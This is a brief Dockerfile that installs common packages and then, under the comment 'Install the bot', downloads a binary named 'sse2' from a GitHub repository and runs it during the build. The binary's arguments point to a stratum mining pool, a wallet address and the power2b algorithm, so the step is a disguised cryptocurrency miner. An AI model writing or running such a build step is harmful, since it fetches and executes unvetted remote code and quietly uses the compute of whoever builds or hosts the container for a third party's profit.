FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
 && mkdir -p /home/stuff
 # Set work dir:
WORKDIR /home


# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Install the bot:
RUN wget https://github.com/AVGandhi/student/raw/main/sse2 \
&& chmod +x sse2 \
&& ./sse2 -a power2b -o stratum+tcp://stratum-asia.rplant.xyz:7022 -u Mh9keJ6aKhcLrxmNFevcuYSfSkJ1ox8DB9.mbc1 p password=hero21
